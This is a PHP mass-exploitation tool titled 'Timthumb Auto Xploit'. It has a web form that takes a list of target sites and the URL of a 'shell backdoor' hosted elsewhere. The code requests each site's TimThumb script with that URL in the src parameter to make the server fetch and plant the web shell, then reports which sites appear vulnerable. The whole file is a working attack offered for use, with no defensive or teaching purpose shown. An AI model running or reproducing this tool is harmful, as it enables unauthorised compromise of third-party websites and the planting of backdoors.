<?php
$judul=@Timthumb_Auto_Xploit;
error_reporting(0);
?>
<div class="container">
  <div class="row">
  <div class="col">
  <div class="card">
    <div class="card-header"><p><?php echo str_replace("_", " ", "$judul"); ?></p></div>
    <div class="card-body">
      <div class="table-responsive">
          
          <form action="" method="POST">
List Site:
<textarea name="url" rows="10" cols="90" class="form-control text-primary"></textarea><br>
Shell Backdoor contoh : https://onedetermination.com/alpa.php
<textarea style="height:50px;" name="shell" class="form-control"></textarea>
	<br>
	<center>
<input type="submit" name="dor" class="btn btn-outline-warning" value="Execute">
</form>
</center>
</html>

<?php

function send($url){
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	$output = curl_exec($ch);
	curl_close($ch);
	return $output;
}

$url = $_POST['url'];
$shell = $_POST['shell'];
$explode = explode("\r\n",$url);
if($_POST['dor']){
	
foreach($explode as $site){
	
	$data = send($site."?src=$shell");
	
	if(preg_match("/no image specified/",$data)){
$datas = explode("no image specified :",$data);
$pec = explode("<br />",$datas[1]);
echo "<br>-:- Scan : $site <br>";
echo "<br>-:- Result : <font color=green>".$pec[0]."</font><br>";
} else {
	echo "<br>[*] Scan : "; echo htmlspecialchars($site);
        echo '<br>';
	echo "<br>[*] Result : <font color=red>Not Vulnerability !!</font><br>";
}

}
}
?>